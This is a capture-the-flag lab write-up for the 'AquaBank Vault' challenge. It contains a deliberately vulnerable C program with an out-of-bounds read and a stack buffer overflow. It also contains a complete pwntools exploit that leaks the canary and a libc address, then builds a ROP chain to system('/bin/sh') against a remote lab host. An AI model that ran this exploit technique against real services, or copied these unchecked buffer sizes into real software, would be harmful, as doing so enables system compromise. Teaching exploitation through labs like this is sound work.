## AquaBank Vault - ret2libc with Out of Bounds Read and Buffer Overflow

We now direct our analytical attention to the laboratory exercise designated as AquaBank Vault, which simulates a secure deposit system implemented in the C programming language, where the objective requires the circumvention of modern memory protections through a complex exploitation strategy. Upon a meticulous examination of the provided source code, one will immediately notice a critical logical discrepancy within the `print_receipt` function, given that the application correctly restricts the initial user input to 64 bytes but subsequently invokes the `fwrite` function to output 256 bytes directly from the local buffer to the standard output. This significant disparity establishes a severe **Out of Bounds Read** vulnerability, which provides an attacker with the capability to sequentially extract sensitive data residing adjacent to the buffer on the execution stack.

By carefully padding the initial input to traverse the uninitialized memory space, an exploit developer can successfully leak the dynamically generated stack canary, which serves as a crucial defense mechanism against stack smashing attacks, alongside internal pointers belonging to the C standard library. Once the raw memory dump is intercepted, the attacker isolates the eight byte canary value and calculates the base address of the standard library by subtracting the known offset of the initialization function, which effectively nullifies the Address Space Layout Randomization protection and allows for the precise localization of necessary execution gadgets.

Having acquired the necessary memory primitives, the assessment proceeds to the `open_vault` function, where the developer allocated a character array of 128 bytes but explicitly permitted the `read` function to accept up to 512 bytes, which inherently introduces a classic **Buffer Overflow** condition. Because the attacker now possesses the valid stack canary, they can construct a precise payload that fills the initial buffer, seamlessly replaces the canary with its exact expected value to bypass the process termination routine, and overwrites the saved instruction pointer with a Return Oriented Programming chain. This execution chain is carefully orchestrated to load the memory address of the command shell string into the primary argument register, align the stack execution boundary, and redirect the program flow to the system function, which ultimately grants interactive administrative control over the vulnerable application.



```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static void setup(void) {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

static void banner(void) {
    puts("=== AquaBank Safe Deposit Vault ===");
    puts("Insert your card to issue a receipt or open the vault.");
}

static void print_receipt(void) {
    char buf[64];

    puts("Type the receipt header (up to 64 chars):");
    ssize_t n = read(STDIN_FILENO, buf, sizeof(buf));
    if (n <= 0) return;

    puts("--- RECEIPT ---");
    fwrite(buf, 1, 256, stdout);
    puts("");
    puts("---------------");
}

static void open_vault(void) {
    char combo[128];

    puts("Enter your combination:");
    (void)read(STDIN_FILENO, combo, 512);
    printf("Combination registered: %.32s ...\n", combo);
}

static void menu(void) {
    char line[16];
    while (1) {
        puts("");
        puts("=== AquaBank Vault ===");
        puts("1) Print receipt");
        puts("2) Open vault");
        puts("3) Exit");
        printf("> "); fflush(stdout);
        if (!fgets(line, sizeof(line), stdin)) break;
        switch (atoi(line)) {
            case 1: print_receipt(); break;
            case 2: open_vault();    return;
            case 3: puts("Bye");     return;
            default: puts("?");
        }
    }
}

int main(void) {
    setup();
    banner();
    menu();
    return 0;
}
```



```Python
from pwn import *

exe = elf = ELF('./aquabank-vault', checksec=False)
context.binary = exe
context.os = 'linux'
context.arch = 'amd64'

HOST, PORT = 'offsec.m0lecon.it', 13597

OFFSET_TO_CANARY = 136
OFFSET_TO_RIP = 152
ret_gadget = 0x40101a

def conn():
    if args.LOCAL:
        r = process(elf.path)
        libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
    else:
        r = remote(HOST, PORT)
        libc = ELF('libc.so.6', checksec=False)
    return r, libc

def main():
    p, libc = conn()

    payload_printf = b"A" * 64

    p.recvuntil(b'> ')
    p.sendline(b"1")
    p.recvuntil(b'Type the receipt header (up to 64 chars):')
    p.sendline(payload_printf)
    p.recvuntil(b'--- RECEIPT ---\n')

    p.recvuntil(b'A' * 64)
    p.recv(8)
    canary = p.recv(8)
    canary = u64(canary)

    payload_printf = b"A"

    p.recvuntil(b'> ')
    p.sendline(b"1")
    p.recvuntil(b'Type the receipt header (up to 64 chars):')
    p.sendline(payload_printf)
    p.recvuntil(b'--- RECEIPT ---\n')

    leaked = p.recv(256)
    
    leaked_libc_addr = u64(leaked[0x98:0xa0]) - 0x8a

    libc.address = leaked_libc_addr - libc.symbols['__libc_init_first']

    rop = ROP(libc)
    pop_rdi_gadget = rop.find_gadget(['pop rdi', 'ret'])[0]

    system_addr = libc.symbols['system']

    bin_sh_addr = next(libc.search(b"/bin/sh\x00"))

    p.recvuntil(b'> ')
    p.sendline(b"2")

    payload_bof = flat(
        b"A" * OFFSET_TO_CANARY,
        canary,
        b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
        pop_rdi_gadget,
        bin_sh_addr,
        ret_gadget,
        system_addr
    )

    p.recvuntil(b'Enter your combination:\n')
    p.sendline(payload_bof)
    p.interactive()

if __name__ == "__main__":
    main()
```

> **Out of Bounds Read:** This vulnerability occurs when a program reads data past the end, or before the beginning, of the intended buffer, which frequently allows attackers to extract sensitive information such as cryptographic keys, memory addresses, or stack canaries that are necessary to bypass memory exploit mitigations.